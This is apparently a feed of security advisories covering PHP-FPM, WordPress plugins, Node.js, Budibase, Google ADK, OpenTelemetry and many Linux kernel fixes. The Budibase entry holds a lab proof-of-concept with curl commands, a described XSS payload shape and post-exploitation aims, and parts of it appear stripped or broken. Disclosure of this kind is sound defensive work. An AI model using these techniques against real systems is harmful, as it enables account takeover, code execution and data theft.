PHP-FPM request smuggling through an unread HTTP request body.

PHP does not discard the unread part of an HTTP request body at request shutdown when the application has opened php://input without reading it to the end. When the front end reuses backend connections, which is not the default in nginx or Apache (for example nginx with fastcgi_keep_conn on, or Apache mod_proxy_fcgi with enablereuse=on), PHP-FPM can parse the leftover bytes as a new FastCGI request. An unauthenticated remote attacker can use a single crafted multipart/form-data request to forge a backend request with chosen parameters such as SCRIPT_FILENAME, REMOTE_ADDR and PHP_ADMIN_VALUE, which can lead to execution of attacker-controlled PHP code. With LSAPI, subsequent requests on the connection can be disrupted.

This issue affects PHP versions before 8.2.36, 8.3.* before 8.3.37, 8.4.* before 8.4.28 and 8.5.* before 8.5.13.

items.title: WP Fastest Cache <= 1.5.3 - Unauthenticated Sensitive Information Exposure via Cached wp-activate.php Response
items.description: The WP Fastest Cache plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 1.5.3. The plugin caches the response of Core’s wp-activate.php without honoring its no-store/no-cache headers, the wp-activate-* cookie, or the WP_INSTALLING state, writing the credential-bearing activation response to a publicly accessible cache file. This makes it possible for unauthenticated attackers to retrieve the plaintext username and twelve-character password of the most recently activated Multisite registrant from that cached wp-activate.php response. Exploitation requires a Multisite subdirectory installation with public user and site registration enabled, and the credentials are only exposed after a genuine registrant follows their activation link.
vendor_products: emrevona WP Fastest Cache – WordPress Cache Plugin

items.title: Node.js is vulnerable to an HTTP/2 denial of service via a NULL pointer dereference when a respondWithFile() download is cancelled
items.description: A NULL pointer dereference in Node.js HTTP/2 lets an unauthenticated client crash the server, over both TLS and cleartext, by cancelling file downloads. When the server serves a file with stream.respondWithFile() or stream.respondWithFD() and the client cancels the request, a StreamPipe used for the transfer is torn down in an order that leaves a NULL pointer which is then dereferenced, aborting the process. No crafted frames are needed, and a handful of cancelled requests against a default file-serving handler is enough. This vulnerability affects Node.js 26.x, 24.x, and 22.x.

items.title: Node.js is vulnerable to an HTTP/2 memory exhaustion denial of service via unaccounted inbound DATA on an undrained stream
items.description: An unauthenticated HTTP/2 client can exhaust Node.js server memory because inbound DATA queued on an undrained stream is charged to no session budget. Each inbound DATA frame creates one JavaScript Buffer view in the receiving stream's readable queue, but nothing charges that queue to current_session_memory_: the socket read buffer is accounted only during parsing and released immediately, so whatever stays queued is accounted to nothing. A peer that fills a stream's receive window with one-byte DATA frames pays about 10 wire bytes per frame while the server retains about 114 bytes per frame, so a single stream on one connection can retain hundreds of megabytes from tens of megabytes sent. maxSessionMemory neither bounds the growth nor refuses new streams, because Http2Session::CanAddStream gates admission on the same counter that never sees the queue. This vulnerability affects Node.js 26.x and 24.x.

items.title: Node.js is vulnerable to a heap buffer overflow in HTTP/2 session.altsvc() via a long origin
items.description: A one-byte heap buffer overflow in Node.js HTTP/2 Alt-Svc handling lets a remote, unauthenticated attacker corrupt process memory. When an application passes an attacker-controlled value such as a request's :authority header to Http2Session.altsvc(), the AltSvc implementation in src/node_http2.cc allocates a buffer sized to the origin length and then writes it with a null terminator, placing one byte past the end of the allocation. A single request carrying a long but syntactically valid :authority triggers the out-of-bounds write, which aborts the process and serves as a remote heap-corruption primitive. This vulnerability affects Node.js 26.x and 24.x.

items.title: Budibase: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin
items.description: ## Description ### Summary A **low-privileged application end-user** (role `BASIC` - **not** a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a **builder or admin** later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section **Formula** column editor, or any binding drawer), the stored value is rendered as **raw HTML** and the attacker's JavaScript executes in the Builder's origin. The Builder SPA is served by nginx with **no Content-Security-Policy** (the CSP middleware only decorates the server-rendered *published-app* document, not `/builder/`). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a **cross-privilege stored XSS** (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS. ### Details **Root cause 1 - the escaper is a no-op.** `packages/frontend-core/src/utils/jsonFormatter.ts` (`format()`): ```js jsonString = jsonString .replace(/&/g, "&") // no-op: replaces "&" with "&" (should be "&") .replace(//g, ">") // no-op (should be ">") return jsonString.replace( /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g, (match) => { if (/^"/.test(match)) { if (/:$/.test(match)) { color = colors.keyColor } // KEY: NOT escaped else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped } return `${match}` }) ``` Only quoted JSON *string values* are passed through `escapeHtml`. Everything else is emitted verbatim, because the leading `.replace(/&/g,"&")…` chain replaces each character with itself. Two consequences: 1. A **raw, non-JSON string** (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned **completely un-escaped**. 2. **Object keys** are never escaped. **Root cause 2 - the output is injected with `{@html}`.** `packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte`: - line 116: `{@html logLine.log}` - line 128: `{@html highlightedResult}` `highlightedResult` is the output of `JsonFormatter.format()`, so the un-escaped attacker string is inserted into the DOM as live markup. **Root cause 3 - binding output is not entity-escaped upstream.** Every `{{ … }}` statement is wrapped by the `ALL` helper in `packages/string-templates/src/helpers/index.ts`, which returns a `Handlebars.SafeString`; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/`{@html}` sink. **Root cause 4 - no CSP on the Builder.** `GET /builder/*` is served as a static SPA by nginx with **no** `Content-Security-Policy` header (verified live below). The `contentSecurityPolicy` middleware (`packages/backend-core/src/middleware/contentSecurityPolicy.ts`) only sets a nonce-based CSP on the server-rendered *published-app* document (`serveApp`). So in the Builder origin there is no `script-src` restriction and inline event handlers run freely. **Cross-privilege data channel.** Internal-table dev/prod data live in separate databases, but **external datasources are queried live and shared** between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A `BASIC` app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. `RowUtils.generateGoldenSample()` even *prefers the longest string per column*, guaranteeing a long payload is the sample the Preview evaluates. **Payload shape note.** `jsonFormatter.format()` tokenises quoted strings, digits and `true/false/null` into ``s, which would fragment a handler containing them. A payload free of double-quotes, digits and those literals - e.g. `` - survives verbatim and executes. ### PoC **Environment used for this reproduction (all values real / unredacted):** | Item | Value | |------|-------| | Target | `http://127.0.0.1:3014` (self-host single image, Budibase `v3.44.0`, commit `d1ed6085`) | | Dev app id | `app_dev_cc322a9cd27a492eb934f43b146c6e81` | | Prod app id | `app_cc322a9cd27a492eb934f43b146c6e81` | | External Postgres table | `datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl` | | Attacker (low-priv `BASIC`) | `lowuser@budibase.local` / `LowUser!2026#bb` | | Victim (builder/admin) | `admin@budibase.local` / `LabAdmin!2026#bb` | --- #### Step 0 - (precondition, performed once by the builder) a data-collection app grants `BASIC` write on the table ```bash # grant the low user BASIC role on the app curl -s -b creds/admin.cookies -H "Content-Type: application/json" -X POST \ http://127.0.0.1:3014/api/global/users \ -d '{"_id":"us_df036f58299242608f665700b1618057","_rev":"1-f24520b49fae0a6f4a23dced7a82fcc8","email":"lowuser@budibase.local","builder":{"global":false},"admin":{"global":false},"roles":{"app_cc322a9cd27a492eb934f43b146c6e81":"BASIC"},"tenantId":"default","status":"active"}' # open write permission on the table to BASIC (typical of feedback/survey/contact apps) curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \ "http://127.0.0.1:3014/api/permission/BASIC/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/write" curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \ "http://127.0.0.1:3014/api/applications/app_dev_cc322a9cd27a492eb934f43b146c6e81/publish" ``` --- #### Step 1 - charset=utf-8 [{"id":1,"name":"",...}, {"id":2,"name":"",...}, {"id":5,"name":"",...}, {"id":6,"name":"",...}, {"id":7,"name":"","email":"rx@x.tld",...}] ``` --- #### Step 4 - confirm the Builder origin ships NO Content-Security-Policy ```bash curl -s -D - -o /dev/null http://127.0.0.1:3014/builder/ ``` **Burp - Response (note the complete absence of any `Content-Security-Policy` header)** ```http HTTP/1.1 200 OK Server: nginx Date: Wed, 02 Sep 2026 07:21:09 GMT Content-Type: text/html; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive Vary: Accept-Encoding Last-Modified: Thu, 27 Aug 2026 14:26:10 GMT Cache-Control: max-age=0 Content-Encoding: gzip ``` --- #### Step 5 - VICTIM triggers execution (builder/admin, in the browser) Logged into the Builder as `admin@budibase.local`, the victim opens the shared table and evaluates a binding over it - the ordinary workflow for building a Formula column: 1. Open the app → **Data tables** → datasource **LabPG** → table **`users_tbl`**. 2. Click the **+** to add a column, name it (e.g. `xsscol`), set **Type = Formula**. 3. Click the **lightning** (binding) icon on the *Formula* field → the binding drawer opens. 4. In the code editor type: `{{ name }}` 5. Click the **play** (▶ / evaluate) button. The right-hand **Preview** panel renders the stored value through `JsonFormatter.format()` → `{@html}`. The injected `` is inserted as a **live DOM element**; its `onerror` fires and the attacker's JavaScript runs in the Builder origin. **Observed result (captured live in the reproduction):** ``` window.__xss_calls = ["localhost"] // alert() was called with document.domain window.xssproof = "localhost" // attacker JS mutated the Builder's window object document.domain = "localhost" // execution context = the BUILDER origin location.href = http://localhost:3014/builder/workspace/app_dev_cc322a9cd27a492eb934f43b146c6e81/data/table/... ``` **Popup - `alert(document.domain)` firing in the Builder origin, with the injected `` visible as a broken-image element in the Preview panel:** ![F4 stored XSS – alert popup in the Budibase Builder](./F4-xss-alert-popup.png) > Screenshot note: the browser used for automated reproduction is headless, and native `alert()` dialogs are not captured by page-level screenshots. `window.alert` was therefore wrapped with a faithful, screenshot-capturable popup that displays exactly the argument the injected script passed to `alert()`. The execution itself is 100% genuine and unmodified - the payload's `onerror` handler ran, called `alert()`, and set `window.xssproof` on the real Builder `window` (see the observed values above). The broken-image glyph in the **Preview** pane is the attacker-controlled `` inserted by the `{@html}` sink. ### Impact **Type:** Cross-privilege **Stored / persistent Cross-Site Scripting (XSS)** in the application builder. **Who is impacted:** any self-hosted (or cloud) Budibase workspace that exposes an external-datasource table for writes to lower-privileged roles - the standard pattern for feedback forms, contact/lead capture, surveys, support tickets, registration, and any "data collection" app. On such apps the writer can be a `BASIC` app user or, when the write screen is public, an **unauthenticated** visitor. **What the attacker gains:** the payload executes in the **Builder/admin session**, an origin with **no CSP**. From there the attacker's JavaScript can silently drive every authenticated Builder API in the victim's context, e.g.: - create a REST/SQL **datasource** or an **automation** step that runs server-side JavaScript / Bash → **remote code execution** on the server; - read or modify **every table** in the workspace (full data exfiltration / tampering); - **escalate** the attacker's own account (or create a new one) to builder/admin; - pivot to the underlying CouchDB/MinIO/Redis via server-side automation.

items.title: Node.js is vulnerable to a client certificate authentication bypass via TLS 1.2 renegotiation servername change
items.description: A client certificate authentication bypass in Node.js TLS lets a client change the servername during TLS 1.2 renegotiation to reach endpoints it was not authorized for. On a server that applies different client-certificate policies per hostname, for example stricter admin-only client-cert auth on one host and ordinary client-cert auth on another, a client that authenticates for a permitted host can renegotiate the TLS 1.2 connection under a different servername and carry its existing authentication to the protected host, bypassing the stricter policy. This vulnerability affects Node.js 26.x, 24.x, and 22.x.

items.title: Appointment Booking Plugin <= 5.7.6 - Unauthenticated Stored Cross-Site Scripting via Customer Email Field
items.description: The Appointment Booking Plugin – LatePoint | Calendar & Scheduling for WordPress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'customer[email] (inside params)' parameter in all versions up to, and including, 5.7.6 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. An unauthenticated visitor can exploit this by registering as a LatePoint customer via the public booking form — receiving an active customer session with no WordPress account — and then submitting a quoted local-part email address containing an HTML payload (e.g. a tag with no spaces) that passes FILTER_VALIDATE_EMAIL but is stored and rendered unescaped.
vendor_products: latepoint Appointment Booking Plugin – LatePoint | Calendar & Scheduling for WordPress

items.title: GPTranslate <= 2.34.17 - Unauthenticated Stored Cross-Site Scripting via Simple HTML DOM Noise Key Collision in HTML DOM Server-Side Translation
items.description: The GPTranslate – Multilingual AI Translation Agent for WordPress: Translate Your Site with AI plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'comment' parameter in all versions up to, and including, 2.34.17 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Exploitation requires the plugin's non-default 'HTML DOM method' to be enabled for server-side translation, and a translation row for the target language-prefixed URL must exist to arm the output buffer that routes page content through the vulnerable Simple HTML DOM parser.
vendor_products: john-dagelmore GPTranslate – Multilingual AI Translation Agent for WordPress: Translate Your Site with AI

net: openvswitch: conntrack: fix helper UAF due to extensions realloc

While calling the helpers, a raw pointer to the extensions area is
wired into expectations list:

  -> nf_ct_helper()

    -> nf_ct_expect_related_report()

Note that the helper rejection now leaves the mark and labels set,
but that's not different from how the NAT was handled before or how
the mark and the labels were handled on confirmation failure.  And
there are no atomicity guarantees provided by the API anyway.

In the Linux kernel, the following vulnerability has been resolved:

ceph: reject mdsmaps that claim more than CEPH_MAX_MDS ranks

check_new_map() sizes its export-target bitmap from CEPH_MAX_MDS but walks
it with newmap->possible_max_rank, which comes straight off the wire:
ceph_mdsmap_decode() sets it to max(m_num_active_mds, m_max_mds), then
overwrites it with the size of the "in" set.  Neither is bounded by
CEPH_MAX_MDS, only by m_info allocating, so a monitor announcing more ranks
than the bitmap holds makes test_bit() read past the end of targets[].  The
clear_bit() loop above indexes the same bitmap, though it is additionally
bounded by mdsc->max_sessions.  The map arrives on the monitor connection,
which is unauthenticated in legacy msgr mode.

CEPH_MAX_MDS is a protocol constant from src/mds/mdstypes.h, and the
reserved inode ranges in super.h are laid out one rank apart over that
span, so a map claiming more ranks is corrupt.  Reject it where the rank
space is established rather than letting the count reach check_new_map().

In the Linux kernel, the following vulnerability has been resolved:

ceph: fix integer overflow in the snap trace bounds check

ceph_update_snap_trace() bounds the two encoded snapid arrays that follow a
struct ceph_mds_snap_realm with sizeof(u64) * (num_snaps +
num_prior_parent_snaps).  Both counts come straight off the wire as __le32,
so the addition is evaluated in unsigned int and wraps before sizeof(u64)
promotes it to size_t: an MDS sending num_snaps = 1 and
num_prior_parent_snaps = 0xffffffff makes the sum zero and the check
degenerates to ceph_decode_need(&p, e, 0, bad), which always passes.
dup_array() then reads num_snaps * 8 bytes past the end of the message
front, which ceph_msg_new2() allocates at exactly front_len bytes.  An
unsolicited CEPH_MSG_CLIENT_SNAP reaches this from a malicious or
compromised MDS with no client-side action, as do the snaptraces carried in
an MDS reply and in a cap import.

Compute the length with size_add()/size_mul() so it saturates at SIZE_MAX
instead of wrapping, in the style fs/ceph/mdsmap.c already uses for
num_export_targets.

In the Linux kernel, the following vulnerability has been resolved:

nfsd: hold cl_lock in client_has_openowners()

client_has_openowners() walks clp->cl_openowners and reads so_stateids
without clp->cl_lock. nfs4_put_stateowner() unhashes that openowner under
cl_lock and then frees it, so a concurrent EXCHANGE_ID with mismatched
creds can use-after-free the nfs4_openowner.

BUG: KASAN: slab-use-after-free in client_has_state+0x10a/0x140
  fs/nfsd/nfs4state.c:3718 client_has_openowners()
  nfsd4_exchange_id
  nfsd4_proc_compound
  nfsd_dispatch
  svc_process

Take clp->cl_lock while client_has_openowners() walks the openowner
list.

items.title: Cross-Application Artifact Namespace Isolation in Google Agent Development Kit (ADK) for Python
items.description: Exposure of Resource to Wrong Sphere (CWE-668) in FileArtifactService in Google Agent Development Kit (ADK) for Python (google-adk) versions 1.19.0 before 1.39.1 and 2.0.0a1 before 2.7.0 allows a caller in one application to list, read, overwrite, or delete artifacts belonging to another application when both applications share a FileArtifactService root directory and use the same user_id (and session_id for session-scoped artifacts). FileArtifactService accepted app_name across its public API methods but omitted app_name when constructing on-disk paths (root/users/{user_id}/... instead of root/apps/{app_name}/users/{user_id}/...). Version 2.6.0 scoped writes by app_name but retained a legacy root/users/{user_id} fallback for reads and deletes; version 2.7.0 and the 1.x backport in version 1.39.1 removed the fallback and enforce full per-app path scoping.

In the Linux kernel, the following vulnerability has been resolved:

scsi: libiscsi: Validate the ITT reflected in a Reject PDU

A Reject PDU carries a copy of the header it rejects, and
iscsi_handle_reject() takes the ITT out of that copy to find the task to
clean up:

      memcpy(&rejected_pdu, data, sizeof(struct iscsi_hdr));
      ...
      task = iscsi_itt_to_task(conn, rejected_pdu.itt);

That value is whatever the target put there. iscsi_itt_to_task() bounds
the index against cmds_max and checks nothing else, so any task in the
pool can be named, and iscsi_nop_out_rsp() then completes it.

An index that has never been used gives a NULL task->conn: the pool is
zeroed at session setup and conn is assigned only when a task is
allocated. If the task was used and returned, iscsi_complete_task() hits
its WARN_ON_ONCE(task->state == ISCSI_TASK_FREE) and the refcount
underflows. An in-flight SCSI command is completed as successful - a 1
MiB read returned 1048576 with none of its buffer written and no
warning.

Validate the reflected ITT the way iscsi_itt_to_ctask() validates a
command ITT, and require the task to be in flight and not a SCSI
command.

In the Linux kernel, the following vulnerability has been resolved:

scsi: libiscsi: Reject a negative task index from parse_pdu_itt

A transport that implements parse_pdu_itt hands libiscsi an index taken
from the PDU, and both lookups bound it from above only:

      if (i >= session->cmds_max)

i and cmds_max are both int, so a negative index passes and
session->cmds[i] is read from before the array.

be2iscsi produces one. beiscsi_parse_pdu() assigns the raw tag,

      *index = (int)itt;

and beiscsi_complete_pdu() forwards an unsolicited NOP-In from the
hardware async ring without replacing its ITT, so the value is the
target's. It also reports the session's own age rather than the one in
the tag, which leaves the age comparison in iscsi_verify_itt() with
nothing to reject.

Bound the index from below in both lookups.

items.title: OpenTelemetry Python: Denial of service through quadratic-time traceparent parsing in opentelemetry-api
items.description: OpenTelemetry Python provides the Python API and SDK for OpenTelemetry. Prior to 1.45.2, TraceContextTextMapPropagator.extract() in opentelemetry-api can perform quadratic-time regular-expression backtracking on a malformed traceparent value containing a trace-context prefix, a long whitespace sequence, and an embedded newline. Exploitation requires an attacker-controlled carrier that preserves embedded newlines and permits a sufficiently large value, because conforming HTTP header values cannot contain embedded newlines. JSON-based carriers, including applicable MCP request metadata integrations, can preserve the required newline depending on the SDK, instrumentation, and message-size limits. Parsing on an asynchronous server's event-loop thread can consume excessive CPU and delay unrelated requests, while the advisory does not establish disclosure, modification, or code execution. This issue is fixed in version 1.45.2.

items.title: FS Poster - WordPress Social media Auto Poster & Scheduler [Facebook, Instagram, Twitter, Pinterest] <= 8.0.1 - Missing Authorization to Unauthorized Social App Data Modification via 'fsp_app_redirect' / 'app' Parameters
items.description: The FS Poster - WordPress Social media Auto Poster & Scheduler [Facebook, Instagram, Twitter, Pinterest] plugin for WordPress is vulnerable to missing authorization to Unauthorized Social App Data Modification in all versions up to, and including, 8.0.1 This is due to missing authentication, nonce, and capability checks in the `standardFSApp()` function, which is registered on the `wp` action hook and executes on every frontend page load without any login or permission verification. This makes it possible for unauthenticated attackers to insert arbitrary social network app records into the database, or overwrite the OAuth `client_id` and `client_secret` of existing social network connections, by supplying attacker-controlled values via the `fsp_app_redirect` and `app` GET parameters. An attacker can target a specific existing social app record for credential overwrite by supplying matching `social_network` and `slug` values, requiring no knowledge of internal record IDs, which disrupts scheduled social media posts and forces administrators to re-authenticate their connected accounts.
vendor_products: fs-code FS Poster - WordPress Social media Auto Poster & Scheduler [Facebook, Instagram, Twitter, Pinterest]

items.title: Appointment Booking Plugin <= 5.7.7 - Unauthenticated Sensitive Information Exposure in 'key' Parameter
items.description: The Appointment Booking Plugin – LatePoint | Calendar & Scheduling for WordPress plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 5.7.7 via the 'key' parameter. This makes it possible for unauthenticated attackers to extract full invoice and receipt records including customer full name, email address, phone number, invoice line items and totals, and the invoice's real access key. This is exploitable via the unauthenticated public routes invoices__view_by_key and transactions__view_receipt_by_key, which apply no ownership, capability, or nonce check before passing the attacker-supplied key into the ORM lookup.

In the Linux kernel, the following vulnerability has been resolved:

lockd: Fix use-after-free in nlmsvc_retry_blocked

nlmsvc_retry_blocked() examines the block at the head of nlm_blocked
under nlm_blocked_lock, then releases the lock before calling
nlmsvc_grant_blocked() or retry_deferred_block(). The nlm_blocked list
reference is all that keeps the block alive across that window.
nlmsvc_grant_blocked() does take one of its own, but not until after
the lock has been dropped. Unmounting the nfsd filesystem while a lock
request is still blocked reaches nlmsvc_traverse_blocks(), which drops
the list reference and frees the block along with the nlm_rqst hanging
off it.

  BUG: KASAN: slab-use-after-free in nlm_async_call+0xd6/0x230
  Read of size 8 at addr ffff88811b04c808 by task lockd/8377
    nlm_async_call+0xd6/0x230
    nlmsvc_retry_blocked+0x61c/0x800
    lockd+0x144/0x1c0
  Freed by task 8392:
    nlmsvc_release_block+0x231/0x290
    nlmsvc_traverse_blocks+0x139/0x1b0
    nlm_traverse_files+0x1aa/0xa00
    nlmsvc_free_host_resources+0x12/0x60
    nlm_shutdown_hosts_net+0x127/0x280
    lockd_down+0xd5/0x1c0

Take a reference before releasing nlm_blocked_lock and drop it once
the retry has run.

In the Linux kernel, the following vulnerability has been resolved:

SUNRPC: Do not credit control-record octets to the RPC stream

svc_tcp_sock_recv_cmsg() receives up to two octets into a local
buffer, and returns that count for any record type other than
TLS_RECORD_TYPE_ALERT. Nothing reached the caller's buffer, but
svc_tcp_read_marker() adds the count to sk_tcplen and
svc_tcp_read_msg()'s caller adds it to sk_datalen. The RPC stream
advances over octets it never received. The fragment marker is
assembled from stale sk_marker octets. The message body comes from
pages nothing wrote.

A conforming client reaches this. RFC 8446 Section 4.6.3 lets either
peer send KeyUpdate once it has sent its Finished, and svcsock has no
rekey path. kTLS leaves the partially consumed record on ctx->rx_list,
so the body drains two octets per svc_tcp_recvfrom() call. Each pair
is credited the same way.

Return -EAGAIN for a record that is not an alert. That is what
svc_tcp_sock_process_cmsg()'s default arm returned before the receive
moved into a local buffer.

In the Linux kernel, the following vulnerability has been resolved:

nfsd: preflight SEQUENCE replies before accepting a slot

nfsd4_sequence() narrows the reply buffer to the session's cached
reply limit before it accepts the slot seqid. A client may negotiate
ca_maxresponsesize_cached down to NFSD_MIN_HDR_SEQ_SZ, and
nfsd4_alloc_slot() then gives every slot a zero-length sl_data[]. A
COMPOUND tag can fill that narrowed buffer until it holds the
SEQUENCE opcode but not the status word that follows.
nfsd4_encode_operation() returns without running
nfsd4_encode_sequence(), so cstate.data_offset stays zero. It leaves
op->status at nfs_ok as well, so the COMPOUND is treated as having
succeeded.

nfsd4_store_cache_entry() declines to cache a lone SEQUENCE that
returned an error. That test reads the status the operation
reported, so it passes here. The copy starts at offset zero and
takes the whole reply, RPC and COMPOUND headers included, into the
zero-length sl_data[]. The COMPOUND tag is copied along with it, so
the client picks most of the bytes written past the end of the slot:

  BUG: KASAN: slab-out-of-bounds in read_bytes_from_xdr_buf+0x1bc/0x390
  Write of size 80 at addr ffff888003a549cd by task kunit_try_catch/24
   __asan_memcpy+0x38/0x60
   read_bytes_from_xdr_buf+0x1bc/0x390
   nfsd4_sequence_done+0x5b0/0x810
   nfs4svc_encode_compoundres+0x1bf/0x240

Check that the fixed-size SEQUENCE result, plus room for a following
operation's error status, fits the negotiated limit before narrowing
the buffer and consuming the slot seqid. The slot and its reply
cache are left unchanged, as RFC 8881 Section 2.10.6.1.2 requires of
an error returned from SEQUENCE.

In the Linux kernel, the following vulnerability has been resolved:

nfsd: don't modify a session slot when replaying its cached reply

nfsd4_sequence() claims a session slot by setting NFSD4_SLOT_INUSE
under nn->client_lock. A reply served from the slot's reply cache does
not claim it, and that distinction lived only in cstate->status, which
nfsd4_sequence() set to nfserr_replay_cache. Commit cc028a10a48c
("NFSD: Hoist status code encoding into XDR encoder functions") moved
nfsd4_proc_compound()'s cstate->status assignment below the out:
label, and the replay path's goto out was the one path that relied on
skipping it. The test in nfsd4_sequence_done() therefore no longer
identifies a replay, and every replay now stores its reply and clears
NFSD4_SLOT_INUSE as though it owned the slot.

NFSD4_SLOT_INUSE is the interlock: check_slot_seqid() rejects every
sequence id for a slot that is in use, before replay_matches_cache()
runs. A replay never sets it, so two replays can be in flight on the
same slot at once. One can read slot->sl_cred under nn->client_lock
while the other's completion frees and rebuilds it from the XDR
encoder without that lock. Two completions can also collide with each
other and release the same group_info twice. free_svc_cred() leaves
cr_uid, cr_gid and cr_flavor intact, so the reader passes every
earlier test in same_creds() and dereferences a NULL cr_group_info.
From a 6.12.91 production server:

  BUG: kernel NULL pointer dereference, address: 0000000000000004
  CPU: 63 UID: 0 PID: 39015 Comm: nfsd
  RIP: 0010:same_creds+0x38/0xa0 [nfsd]
  RDX: 0000000000000000
  Call Trace:
   nfsd4_sequence+0x6a8/0x910 [nfsd]
   nfsd4_proc_compound+0x345/0x670 [nfsd]
   nfsd_dispatch+0x100/0x220 [nfsd]
   svc_process_common+0x311/0x700 [sunrpc]
   svc_process+0x131/0x1c0 [sunrpc]
   svc_recv+0x7ef/0x9c0 [sunrpc]
   nfsd+0xa3/0x100 [nfsd]
  Kernel panic - not syncing: Fatal exception

Since v6.14 a live session's slot table can shrink, and the unowned
store becomes a use-after-free write. nfsd4_sequence() defers the
shrink while a slot is in use, but it tests NFSD4_SLOT_INUSE, which a
replay does not set, so free_session_slots() can kfree() the slot the
replay still holds in cstate->slot.

Record the claim in cstate->slot_owned when nfsd4_sequence() accepts a
request and test that in nfsd4_sequence_done(), so only the request
that claimed the slot updates its cached reply and clears
NFSD4_SLOT_INUSE. svc_generic_init_request() zeroes the compound
response before each request, so the flag starts clear.

In the Linux kernel, the following vulnerability has been resolved:

smb: client: fix buffer overflow in SMB2_tcon()

In SMB2_tcon(), unc_path is allocated with a fixed buffer size of
MAX_SHARENAME_LENGTH * 2 bytes (672 bytes). However, the user-controlled
UNC path (tree) length is passed to cifs_strtoUTF16(), which assumes the
destination buffer is large enough and writes strlen(tree) + 1 UTF-16 code
units.

Commit 62a1a439e0fd ("cifs: clean up handling of unc= option") removed the
length check on UNC mount options, allowing mount paths to exceed
MAX_SHARENAME_LENGTH while retaining the fixed-size buffer allocation in
SMB2_tcon(). Consequently, an oversized UNC string causes cifs_strtoUTF16()
to write past the end of the heap object, resulting in a slab-out-of-bounds
write. Furthermore, if a tree exceeds MAX_TREE_SIZE characters, strscpy()
truncates it in cifs_tcon::tree_name, causing subsequent reconnects or
failovers to fail.

Fix this by first verifying that the length of tree does not exceed
MAX_TREE_SIZE, returning -EINVAL if it does. Then, dynamically allocate
unc_path based on the length of tree so that it safely accommodates all
UTF-16 code units for paths within MAX_TREE_SIZE.

[pc: remove unused MAX_SHARENAME_LENGTH]

In the Linux kernel, the following vulnerability has been resolved:

ceph: clamp the inline data length in ceph_fill_inline_data()

The MDS decides how much inline data to attach to a reply, and the
client parses inline_len without any upper bound: ceph_decode_need()
only verifies that the message actually carries that many bytes.
ceph_fill_inline_data() then copies the data into a single folio
with no length check, so a malicious or buggy MDS returning more
inline data than the folio can hold writes past its end.

Clamp the length to folio_size() so both callers, handle_cap_grant()
and fill_inode(), are covered.

In the Linux kernel, the following vulnerability has been resolved:

mptcp: do not use Fast Open on MP_JOIN subflows

tcp_fastopen_create_child() hands the SYN packet itself to
subflow_syn_recv_sock(). For an MP_JOIN request this takes the
fatal fallback: the cloned child is destroyed and handed back with
drop_req flagged, but tcp_fastopen_create_child() does not check
the flag and queues it, so accept() can expose the freed child.

MP_JOIN cannot use Fast Open: data on a subflow requires the
completed HMAC exchange (RFC 8684, sec. 3.2). Refuse it (only the
TFO path passes a SYN skb here) and let tcp_conn_request() fall
back to the regular MP_JOIN handshake; also strip the Fast Open
cookie from MP_JOIN SYN/ACKs.

[ Moving code to avoid clearing TS and consolidating checks. ]

In the Linux kernel, the following vulnerability has been resolved:

net: restore refcount ordering for lockless socket access

Before commit fb041bb7c0a9 ("locking/refcount: Consolidate implementations
of refcount_t"), default builds implemented refcount_inc_not_zero() using
atomic_add_unless(), which provided full memory ordering on success. The
commit removed that ordering on weakly ordered architectures, allowing
accesses after a successful reference acquisition to be reordered before
it.

Use refcount_inc_not_zero_acquire() in the IPv4 and IPv6 established
lookups and in inet_twsk_purge(), where the socket is validated again
after taking a reference.

bpf_sk_assign() can receive a socket pointer obtained through BTF
without a reference. Use acquire ordering when it takes its own reference
for a refcounted socket.

Use refcount_set_release() when setting refcounts in the SYN cookie,
TCP Fast Open, request migration, and TIME_WAIT paths. Keep the existing
TIME_WAIT smp_wmb(), which separately orders the refcount store before
ehash publication.

In the Linux kernel, the following vulnerability has been resolved:

NFSD: copy SETXATTR data from all XDR buffer segments

nfsd4_vbuf_from_vector() manually copies the head followed by whole
pages starting at offset zero. This assumes that all remaining data
starts at the beginning of the page array and that no data is stored
in the tail.

However, nfsd4_decode_setxattr() passes an xdr_buf returned by
xdr_stream_subsegment(). Such a sub-buffer can have a nonzero
page_base and can span its page and tail segments. Ignoring that
layout can copy the wrong bytes into the value passed to
vfs_setxattr().

Use read_bytes_from_xdr_buf(), which observes the complete xdr_buf
layout.

In the Linux kernel, the following vulnerability has been resolved:

xfs: refuse a pNFS LAYOUTCOMMIT of a range without blocks

A client can commit a hole in a LAYOUTCOMMIT, because nfsd does not
check the extents against its layouts. xfs_iomap_write_unwritten() then
allocates written blocks there. A large hole overruns the block
reservation and shuts XFS down. A small one exposes stale data.

Refuse such a range with -EIO, using XFS_BMAPI_CONVERT_ONLY.

In the Linux kernel, the following vulnerability has been resolved:

